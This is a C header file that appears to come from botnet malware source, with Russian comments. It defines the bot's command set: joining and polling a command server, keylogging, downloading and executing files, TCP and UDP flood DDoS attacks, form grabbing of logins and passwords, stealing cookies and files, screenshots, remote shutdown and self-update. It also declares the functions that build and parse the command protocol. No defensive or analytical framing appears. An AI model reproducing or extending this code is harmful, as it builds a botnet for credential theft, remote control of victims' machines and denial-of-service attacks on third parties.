#ifndef COMMANDS_H
#define COMMANDS_H

#define COMMAND_JOIN 0					// Регистрация бота на сервере
#define COMMAND_POLL 1					// Запрос новых команд
#define COMMAND_CHECKIFSITEISUP 2		// Проверка доступности сайта
#define COMMAND_SHUTDOWN 3				// Выключение системы
#define COMMAND_RESTART 4				// Перезагрузка системы
#define COMMAND_MESSAGEBOX 5			// Вывод сообщения на экран
#define COMMAND_KEYLOG 6				// Управление кейлоггером
#define COMMAND_REMOTEPROCESS 7			// Получение информации о процессе
#define COMMAND_DOWNLOADEXECUTE 8		// Скачивание и выполнение файла
#define COMMAND_REMOTEPROCESSNORESULT 9	// Запуск процесса без вывода
#define COMMAND_TCPFLOOD 10				// DDoS-атака (TCP-флуд)
#define COMMAND_UPDATE 11				// Обновление бота
#define COMMAND_SCREENSHOT 12			// Создание скриншота
#define COMMAND_UDPFLOOD 13				// DDoS-атака (UDP-флуд)
#define COMMAND_FORMGRAB 14				// Кража данных форм (логины/пароли)
#define COMMAND_STEALERS 15				// Кража данных (Cookies, файлов)

typedef void(*CommandParserDelegate) (int, int, char*); // Обрабатывает команду (ID команды, тип команды, данные)
typedef void(*PostPollDelegate) (); // Выполняет действия после опроса сервера

char* CreateCommand(int commandId, int commandType, char* data, int dataLength); // Создает команду в формате: "ID|Тип|Закодированные_данные"
void FreeCommand(char* data);// Освобождает память команды

int ParseCommand(char* command, char** commandData, int* commandType, char* delimetr); // Разбирает входящую команду (возвращает ID, тип и данные)
void FreeParsedCommandResult(char* data); // Освобождает память разобранных данных

#endif